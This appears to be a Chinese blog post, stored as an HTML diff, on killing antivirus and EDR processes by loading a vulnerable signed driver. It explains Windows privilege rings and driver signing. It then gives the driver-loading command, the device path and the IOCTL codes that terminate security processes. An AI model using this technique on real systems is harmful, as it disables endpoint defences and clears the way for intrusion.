@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="一、Ring0 - Ring3​    Intel 的 CPU 将特权级别分为 4 个级别，分别是：RING0 、RING1 、RING2 、RING3 。 ​    而Windows 只使用了其中的两个级别 RING0 和 RING3 ，RING0 只给操作系统用，RING3 则是谁都能用。普通程序正常情况是无法执行 RING0 层的指令的。 ​     ​    在Windows 系统中，RI">
+<meta property="og:type" content="article">
+<meta property="og:title" content="通过驱动 kill 杀软学习">
+<meta property="og:url" content="http://example.com/2023/07/02/%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91/%E9%80%9A%E8%BF%87%E9%A9%B1%E5%8A%A8%20kill%20%E6%9D%80%E8%BD%AF%E5%AD%A6%E4%B9%A0/index.html">
+<meta property="og:site_name" content="Darkb1rd">
+<meta property="og:description" content="一、Ring0 - Ring3​    Intel 的 CPU 将特权级别分为 4 个级别，分别是：RING0 、RING1 、RING2 、RING3 。 ​    而Windows 只使用了其中的两个级别 RING0 和 RING3 ，RING0 只给操作系统用，RING3 则是谁都能用。普通程序正常情况是无法执行 RING0 层的指令的。 ​     ​    在Windows 系统中，RI">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://v28nhb.oss-cn-hangzhou.aliyuncs.com/uPic20230702102624.png">
+<meta property="og:image" content="https://v28nhb.oss-cn-hangzhou.aliyuncs.com/uPic20230702113933.png">
+<meta property="article:published_time" content="2023-07-02T04:03:40.000Z">
+<meta property="article:modified_time" content="2023-07-02T04:05:48.071Z">
+<meta property="article:author" content="darkb1rd">
+<meta property="article:tag" content="工具开发">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://v28nhb.oss-cn-hangzhou.aliyuncs.com/uPic20230702102624.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>通过驱动 kill 杀软学习</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<div class="bg-filter" ></div>
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/darkb1rd">项目</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2023/06/09/%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91/%E5%9F%BA%E4%BA%8EHTTP3%E7%9A%84%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/07/02/%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91/%E9%80%9A%E8%BF%87%E9%A9%B1%E5%8A%A8%20kill%20%E6%9D%80%E8%BD%AF%E5%AD%A6%E4%B9%A0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/07/02/%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91/%E9%80%9A%E8%BF%87%E9%A9%B1%E5%8A%A8%20kill%20%E6%9D%80%E8%BD%AF%E5%AD%A6%E4%B9%A0/&text=通过驱动 kill 杀软学习"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/07/02/%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91/%E9%80%9A%E8%BF%87%E9%A9%B1%E5%8A%A8%20kill%20%E6%9D%80%E8%BD%AF%E5%AD%A6%E4%B9%A0/&title=通过驱动 kill 杀软学习"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/07/02/%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91/%E9%80%9A%E8%BF%87%E9%A9%B1%E5%8A%A8%20kill%20%E6%9D%80%E8%BD%AF%E5%AD%A6%E4%B9%A0/&is_video=false&description=通过驱动 kill 杀软学习"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=通过驱动 kill 杀软学习&body=Check out this article: http://example.com/2023/07/02/%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91/%E9%80%9A%E8%BF%87%E9%A9%B1%E5%8A%A8%20kill%20%E6%9D%80%E8%BD%AF%E5%AD%A6%E4%B9%A0/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/07/02/%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91/%E9%80%9A%E8%BF%87%E9%A9%B1%E5%8A%A8%20kill%20%E6%9D%80%E8%BD%AF%E5%AD%A6%E4%B9%A0/&title=通过驱动 kill 杀软学习"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/07/02/%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91/%E9%80%9A%E8%BF%87%E9%A9%B1%E5%8A%A8%20kill%20%E6%9D%80%E8%BD%AF%E5%AD%A6%E4%B9%A0/&title=通过驱动 kill 杀软学习"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/07/02/%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91/%E9%80%9A%E8%BF%87%E9%A9%B1%E5%8A%A8%20kill%20%E6%9D%80%E8%BD%AF%E5%AD%A6%E4%B9%A0/&title=通过驱动 kill 杀软学习"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/07/02/%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91/%E9%80%9A%E8%BF%87%E9%A9%B1%E5%8A%A8%20kill%20%E6%9D%80%E8%BD%AF%E5%AD%A6%E4%B9%A0/&title=通过驱动 kill 杀软学习"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/07/02/%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91/%E9%80%9A%E8%BF%87%E9%A9%B1%E5%8A%A8%20kill%20%E6%9D%80%E8%BD%AF%E5%AD%A6%E4%B9%A0/&name=通过驱动 kill 杀软学习&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/07/02/%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91/%E9%80%9A%E8%BF%87%E9%A9%B1%E5%8A%A8%20kill%20%E6%9D%80%E8%BD%AF%E5%AD%A6%E4%B9%A0/&t=通过驱动 kill 杀软学习"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81Ring0-Ring3"><span class="toc-number">1.</span> <span class="toc-text">一、Ring0 - Ring3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#API%E4%BB%8E%E5%BA%94%E7%94%A8%E5%B1%82%E5%88%B0%E5%86%85%E6%A0%B8%E5%B1%82%E8%B0%83%E7%94%A8%E6%B5%81%E7%A8%8B"><span class="toc-number">1.1.</span> <span class="toc-text">API从应用层到内核层调用流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%BD%E6%95%B0ZW%E4%B8%8ENT%E5%8C%BA%E5%88%AB-%E4%BB%A5ZW%E3%80%81NT%E5%BC%80%E5%A4%B4%E7%9A%84Windows-api%E5%87%BD%E6%95%B0"><span class="toc-number">1.2.</span> <span class="toc-text">函数ZW与NT区别(以ZW、NT开头的Windows api函数)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ring3-%E4%B8%8E-Ring0-%E7%9A%84%E9%80%9A%E4%BF%A1%E6%96%B9%E5%BC%8F"><span class="toc-number">1.3.</span> <span class="toc-text">Ring3 与 Ring0 的通信方式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86%E5%99%A8%E6%97%A0%E6%B3%95KILL%E6%9D%80%E8%BD%AF%E8%BF%9B%E7%A8%8B"><span class="toc-number">1.4.</span> <span class="toc-text">为什么进程管理器无法KILL杀软进程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E9%A9%B1%E5%8A%A8"><span class="toc-number">2.</span> <span class="toc-text">二、驱动</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A9%B1%E5%8A%A8%E7%AD%BE%E5%90%8D"><span class="toc-number">2.1.</span> <span class="toc-text">驱动签名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E9%A9%B1%E5%8A%A8"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞驱动</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0"><span class="toc-number">3.</span> <span class="toc-text">三、代码实现</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number"></span> <span class="toc-text">参考</span></a>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4" >
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        通过驱动 kill 杀软学习
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">darkb1rd</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-07-02T04:03:40.000Z" itemprop="datePublished">2023-07-02</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91/">工具开发</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/%E5%B7%A5%E5%85%B7%E5%BC%80%E5%8F%91/" rel="tag">工具开发</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="一、Ring0-Ring3"><a href="#一、Ring0-Ring3" class="headerlink" title="一、Ring0 - Ring3"></a>一、Ring0 - Ring3</h2><p>​    Intel 的 CPU 将特权级别分为 4 个级别，分别是：<code>RING0</code> 、<code>RING1</code> 、<code>RING2</code> 、<code>RING3</code> 。</p>
+<p>​    而Windows 只使用了其中的两个级别 <code>RING0</code> 和 <code>RING3</code> ，<code>RING0</code> 只给操作系统用，<code>RING3</code> 则是谁都能用。普通程序正常情况是无法执行 <code>RING0</code> 层的指令的。</p>
+<p>​    <img src="https://v28nhb.oss-cn-hangzhou.aliyuncs.com/uPic20230702102624.png"></p>
+<p>​    在Windows 系统中，<code>RING0</code> 层拥有最高的权限， 而 <code>RING3</code>层 拥有最低的权限。按照Intel原有的构想，应用程序工作在<code>RING3</code>层，只能访问<code>RING3</code>层的数据，操作系统工作在<code>RING0</code>层，可以访问所有层的数据，而其他驱动程序位于<code>RING1</code>、<code>RING2</code>层，每一层只能访问本层以及权限更低层的数据。通常情况下，会称<code>RING3</code>为 用户态， <code>RING0</code> 为内核态。</p>
+<p>​    RING设计的初衷是将系统权限与程序分离出来，使之能够让OS更好的管理当前系统资源，也使得系统更加稳定。举个RING权限的最简单的例子：一个停止响应的应用程式，它运行在比RING0更低的指令环上，你不必大费周章的想着如何使系统回复运作，这期间，只需要启动任务管理器便能轻松终止它，因为它运行在比程式更低的RING0指令环中，拥有更高的权限，可以直接影响到RING0以上运行的程序，当然有利就有弊，RING保证了系统稳定运行的同时，也产生了一些十分麻烦的问题。比如一些OS虚拟化技术，在处理RING指令环时便遇到了麻烦，系统是运行在RING0指令环上的，但是虚拟的OS毕竟也是一个系统，也需要与系统相匹配的权限。而RING0不允许出现多个OS同时运行在上面，最早的解决办法便是使用虚拟机，把OS当成一个程序来运行。</p>
+<h3 id="API从应用层到内核层调用流程"><a href="#API从应用层到内核层调用流程" class="headerlink" title="API从应用层到内核层调用流程"></a>API从应用层到内核层调用流程</h3><ul>
+<li>我们在进行Windows编程的时候，经常会调用Windows API。在 Windows 程序中，调用 Windows 函数与调用 C 语言的库函数没有什么两样。</li>
+<li>最主要的区别就是 C 语言<code>库函数的机器代码</code>会直接链接到你的程序代码中去，而 Windows 函数则是放到你的程序之外的<code>DLL</code>里。</li>
+<li>每个 Windows 的 EXE 文件包含它所要用到的各个动态链接库以及库中的函数的引用地址。</li>
+<li>当一个 Windows 程序被装入内存后，程序中的<code>函数调用</code>都被解析成 DLL 函数入口的指针，同时这些被调用的函数也被装入内存。</li>
+<li>当链接 Windows 程序以生成可执行文件时，一定得链接你的编程环境所提供的特殊的“导入库”。</li>
+<li>应用层调用的api一般是被封装在<code>kernel32.dll</code>或者<code>Gdi32.dll</code>/<code>User32.dll</code>动态链接库里面的。</li>
+<li>可以分为两类，一种是<code>Kernel32.dll</code> api，另一种与图形操作、键盘操作、用户操作相关的api则是被封装在<code>Gdi32.dll</code>/<code>User32.dll</code>动态链接库中。这两类api的区别：<ul>
+<li>主要是进入内核之前，<code>Kernel32.dll</code> API会被进一步被封装成<code>Ntdll.dll</code> API，而<code>Gdi32.dll</code>/<code>User32.dll</code> API不会经过封装直接就进入内核；</li>
+<li><code>Kernel32.dll</code> API使用SSDT表(保存在<code>ntoskrnl.exe</code>中)，而<code>Gdi32.dll</code>/<code>User32.dll</code> API则是使用Shadow SSDT表(保存在<code>Win32k.sys</code>中)</li>
+</ul>
+</li>
+</ul>
+<h3 id="函数ZW与NT区别-以ZW、NT开头的Windows-api函数"><a href="#函数ZW与NT区别-以ZW、NT开头的Windows-api函数" class="headerlink" title="函数ZW与NT区别(以ZW、NT开头的Windows api函数)"></a>函数ZW与NT区别(以ZW、NT开头的Windows api函数)</h3><ul>
+<li><p>在<code>Ntdll.dll</code>中:ZW与NT完全一样</p>
+</li>
+<li><p>在<code>ntoskrnl.exe</code>中：</p>
+<ul>
+<li>NT函数是存放在SSDT表中的，用来响用户态的请求或者响应内核态Zw函数的请求，即无论走用户态路径还是内核态路径<code>都是调用NT函数</code> 。</li>
+<li>Zw*-&gt;Nt*(Zw函数会调用Nt)，Nt函数更底层，既然Nt函数更底层，内核态驱动可不可以直接调用NT函数呢？不能！</li>
+<li>因为Zw函数会把<code>kthread</code>中的PreviousMode设置为<code>KernelMode</code>，然后再调用Nt函数，因为此时是<code>KernelMode</code>,所以在<code>Nt</code>函数中就<code>不会进行参数检查</code>。</li>
+<li>而如果<code>直接调用Nt</code>函数的话，必须程序员自己将<code>PreviousMode</code>设置为<code>KernelMode</code>(修改的过程很麻烦的，因为<code>kthread</code>是未导出的，要硬编码偏移来定位PreviousMode，才能修改),否则PreviousMode很可能仍然是<code>UserMode</code>，这样的话，Nt函数就会认为对它的调用来自<code>用户态</code>,从而做一些检查(probe内存，发现驱动传的是内核态内存，但PreviousMode很仍然是<code>UserMode</code>),这时就会调用失败导致蓝屏保护，防止越权。</li>
+<li>所以在内核态，还是老老实实调用Zw函数。</li>
+<li>封装成Irp包： 应用层传下来的参数、请求、命令（文件路径，以什么方式打开文件等）会被封装在Irp数据包。</li>
+<li>发给驱动处理： 比如CreateFile的Irp数据包会发给文件管理驱动ntfs.sys–&gt;磁盘驱动disk.sys,最终由硬件处理，处理完再返回给调用者。</li>
+</ul>
+</li>
+</ul>
+<h3 id="Ring3-与-Ring0-的通信方式"><a href="#Ring3-与-Ring0-的通信方式" class="headerlink" title="Ring3 与 Ring0 的通信方式"></a>Ring3 与 Ring0 的通信方式</h3><ol>
+<li><p><code>buffered io</code></p>
+<ul>
+<li>在内核层分配一块缓存,io管理器负责把应用层/内核层copy到buffer,io管理器负责把buffer拷贝到io管理器负责把内核层/应用层。</li>
+<li>优点:安全简单,因为不会操作应用层的内存,buffer是来自内核态的，应用层无法改内核层的数据,所以是安全的。</li>
+<li>缺点:效率低,因为一次通信有两次拷贝,一般传输数据量是不大的,buffer io是够用的,但如果是类似3d渲染,数据量大,direct io更适合;</li>
+</ul>
+</li>
+<li><p><code>direct io</code></p>
+<ul>
+<li>io管理器通过<code>MPL</code>把应用层/内核层的<code>虚拟地址</code>映射成<code>物理地址</code>,然后<code>lock</code>,防止被这块内存切换出去(pageout),io管理器通过MPL把同一<code>物理地址</code>映射成内核层/应用层的<code>物理地址</code>。</li>
+<li>优点效率是最高的,一次通信只有一次拷贝</li>
+<li>但稍复杂</li>
+</ul>
+</li>
+<li><p><code>neither io</code></p>
+<ul>
+<li>内核层直接访问应用层的数据,前提是应用层和内核层<code>同处于一个进程上下文</code>(因为应用层内存地址是私有的,应用层进程切换之后内存就失效了)，要对内核层传入的内存地址要做检查(<code>ProbeForRead</code>/<code>ProbeForWrite</code>),否则会有提取漏洞 。</li>
+</ul>
+</li>
+</ol>
+<h3 id="为什么进程管理器无法KILL杀软进程"><a href="#为什么进程管理器无法KILL杀软进程" class="headerlink" title="为什么进程管理器无法KILL杀软进程"></a>为什么进程管理器无法KILL杀软进程</h3><p>​    因为通常杀软会在安装的时候加载自家驱动，通过在ring0层对自身驱动进行保护。这样用户就无法对驱动进程进行终止。</p>
+<h2 id="二、驱动"><a href="#二、驱动" class="headerlink" title="二、驱动"></a>二、驱动</h2><figure class="highlight sqf"><table><tr><td class="code"><pre><span class="line">Windows驱动是一种软件组件，用于与操作系统内核进行交互，管理和控制硬件设备或系统资源。驱动程序充当操作系统和硬件设备之间的桥梁，使它们能够相互通信和协调工作。</span><br><span class="line"></span><br><span class="line">在Windows操作系统中，驱动程序以模块的形式存在，通常是以动态链接库（DLL）或内核模块（SYS）的形式提供。驱动程序可以控制各种硬件设备，如网络适配器、图形卡、声卡、打印机、存储设备等，以及其他系统资源，如文件系统、注册表、进程管理等。</span><br><span class="line"></span><br><span class="line">驱动程序通过与操作系统内核进行交互，通过调用内核提供的函数和使用内核提供的数据结构来执行各种操作。驱动程序负责处理硬件设备的初始化、配置、数据传输、中断处理、电源管理等任务。它们还可以提供与硬件设备相关的功能和性能优化。</span><br><span class="line"></span><br><span class="line">驱动程序通常由硬件设备的制造商提供，以确保设备与操作系统的兼容性和正确的功能。驱动程序的正确安装和配置对于设备的正常运行和性能至关重要。</span><br><span class="line"></span><br><span class="line">编写和开发Windows驱动程序需要使用特定的开发工具和编程技术，如Windows驱动程序开发包（WDK）和驱动程序开发框架（<span class="built_in">Driver</span> Framework，简称WDF）。驱动程序的开发和调试通常需要熟悉底层系统编程和操作系统内部机制。</span><br><span class="line"></span><br><span class="line">总而言之，Windows驱动程序是一种关键的软件组件，用于管理和控制硬件设备和系统资源，使其能够与Windows操作系统无缝协同工作。</span><br></pre></td></tr></table></figure>
+<p>​    假设你需要编写一个有权访问核心操作系统数据结构的工具。 这些结构只能通过在内核模式下运行的代码访问。 可以通过将工具拆分成两个组件来执行该操作。 第一个组件在用户模式下运行且提供用户界面。 第二个组件在内核模式下运行且可以访问核心操作系统数据。 在用户模式下运行的组件称为应用程序，在内核模式下运行的组件称为“软件驱动程序” 。 软件驱动程序不与硬件设备关联。</p>
+<p>​    驱动在安全领域的应用：<code>弹窗和拦截</code> 、<code>HOOK</code> 、 <code>绑定与过滤</code> 、 <code>注册回调来监控</code> 等。</p>
+<h3 id="驱动签名"><a href="#驱动签名" class="headerlink" title="驱动签名"></a>驱动签名</h3><p>​    <strong>从 Windows Vista 开始，基于 x64 的 Windows 版本要求在内核模式下运行的所有软件（包括驱动程序）经过数字签名才能加载。</strong></p>
+<p>​    <a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows-hardware/test/hlk/">通过 Microsoft 认证驱动程序</a> ，Microsoft 将提供它的签名。 当驱动程序包通过认证测试时，Windows <a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/dashboard/get-started-dashboard-submissions">硬件质量实验室 (WHQL) </a>进行签名。 如果你的驱动程序包由 WHQL 进行签名，则可以通过 Windows 更新计划或其他 Microsoft 支持的分发机制来分发。</p>
+<p>​    <strong>注意</strong> 必需的内核模式代码签名策略适用于在 Windows Vista 和更高版本的 Windows 上运行的基于 x64 的系统的所有内核模式软件。 但是，Microsoft 鼓励发布者对所有内核模式软件（包括设备驱动程序 (32 位系统) 包含的用户模式驱动程序）进行数字签名。 Windows Vista 和更高版本的 Windows，验证 32 位系统上的内核模式签名。 支持受保护媒体内容的软件必须经过数字签名，即使它是 32 位的。</p>
+<p>​    用户模式驱动程序（如打印机驱动程序）将在基于 x64 的计算机中安装和工作。 安装期间，用户将显示一个对话框，请求批准安装驱动程序。 从 Windows 8 及更高版本的 Windows 开始，除非这些驱动程序包也已签名，否则不会继续安装。</p>
+<p>​    <strong>也就是说通常情况下，未签名的驱动是无法加载进系统的</strong> </p>
+<p>​    微软提供的驱动签名主要有两种：使用证明签名，仅适用于win10 、使用HLK进行认证，适用于win7+win10 。 具体方式可才考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/321507.html">https://www.freebuf.com/articles/system/321507.html</a></p>
+<p>​    而正常的签名流程是需要企业认证，并且向微软进行提交申请的。所以对于一般的个人选手来说，自签名这块一般是走不通的。</p>
+<h3 id="漏洞驱动"><a href="#漏洞驱动" class="headerlink" title="漏洞驱动"></a>漏洞驱动</h3><p>​    正常的流程走不通，就要去找其他利用路线了。找存在漏洞的合法驱动就是应用最为广泛的方向之一。</p>
+<p>​    关于漏洞驱动，国外有一个网站时专门收集这块的：<a target="_blank" rel="noopener" href="https://www.loldrivers.io/">https://www.loldrivers.io/</a></p>
+<p>​    <img src="https://v28nhb.oss-cn-hangzhou.aliyuncs.com/uPic20230702113933.png"></p>
+<p>​    在这个网站上，收集了很多已知存在漏洞的驱动，并且大多数都提供了下载地址。但是具体漏洞位置可能还是需要个人去寻找（当然有些网上能搜到利用代码）。</p>
+<p>​    </p>
+<h2 id="三、代码实现"><a href="#三、代码实现" class="headerlink" title="三、代码实现"></a>三、代码实现</h2><p>​    其实这块，GitHub上有好些开源代码都给了相关的实现步骤。以 <code>https://github.com/ZeroMemoryEx/Terminator</code> 为例，它是通过 重现 Spyboy 技术来终止所有 EDR/XDR/AV 进程。</p>
+<p>该项目提供了一个已签名的驱动以及相关的利用代码。</p>
+<p>​    整个流程分三部分。首先第一部分就是加载驱动：</p>
+<p>​    可以直接使用命令进行加载</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sc create mydriver binpath= C:\dl\drv\antitp.sys <span class="built_in">type</span>= kernel start= demand error= ignore&amp;&amp;sc start mydriver</span><br></pre></td></tr></table></figure>
+<p>​    也可以通过Windows api 函数进行一个加载：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Create the service</span></span><br><span class="line">hService = CreateServiceA(hSCM, g_serviceName, g_serviceName, SERVICE_ALL_ACCESS,</span><br><span class="line">	SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,</span><br><span class="line">	SERVICE_ERROR_IGNORE, driverPath, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">	<span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (hService == <span class="literal">NULL</span>) &#123;</span><br><span class="line">	CloseServiceHandle(hSCM);</span><br><span class="line">	<span class="keyword">return</span> (<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>​    也可以通过注册表进行创建服务并加载。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services</span><br></pre></td></tr></table></figure>
+<p>​    可以参考该注册表项进行添加相应的服务，然后进行加载。</p>
+<p>​    创建了驱动并加载后，此时驱动文件就处于占用状态了，直接是无法删除的。下一步连接驱动即可。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">HANDLE hDevice =</span><br><span class="line">	CreateFile(<span class="string">L&quot;\\\\.\\ZemanaAntiMalware&quot;</span>, GENERIC_WRITE | GENERIC_READ, <span class="number">0</span>,</span><br><span class="line">		<span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Failed to open handle to driver !! &quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> (<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>​    这里需要注意的是，不同的驱动，在<code>CreateFile</code> 时所使用的路径不一样，此处用的是：<code>\\\\.\\ZemanaAntiMalware</code></p>
+<p>​    成功连接到驱动后，向存在漏洞的驱动发送相关的指令即可。以该项目为例：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_REGISTER_PROCESS 0x80002010</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_TERMINATE_PROCESS 0x80002048</span></span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> (!DeviceIoControl(hDevice, IOCTL_REGISTER_PROCESS, &amp;input, <span class="keyword">sizeof</span>(input),</span><br><span class="line">                     <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>)) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Failed to register the process in the trusted list %X !!\n&quot;</span>,</span><br><span class="line">           IOCTL_REGISTER_PROCESS);</span><br><span class="line">    CloseHandle(hDevice);</span><br><span class="line">    <span class="keyword">return</span> (<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">    </span><br><span class="line">procId = (<span class="type">unsigned</span> <span class="type">int</span>)pE.th32ProcessID;</span><br><span class="line"><span class="keyword">if</span> (!DeviceIoControl(hDevice, IOCTL_TERMINATE_PROCESS, &amp;procId,</span><br><span class="line">                     <span class="keyword">sizeof</span>(procId), &amp;pOutbuff, <span class="keyword">sizeof</span>(pOutbuff),</span><br><span class="line">                     &amp;bytesRet, <span class="literal">NULL</span>))</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;faild to terminate %ws !!\n&quot;</span>, pE.szExeFile);</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;terminated %ws\n&quot;</span>, pE.szExeFile);</span><br><span class="line">    ecount++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
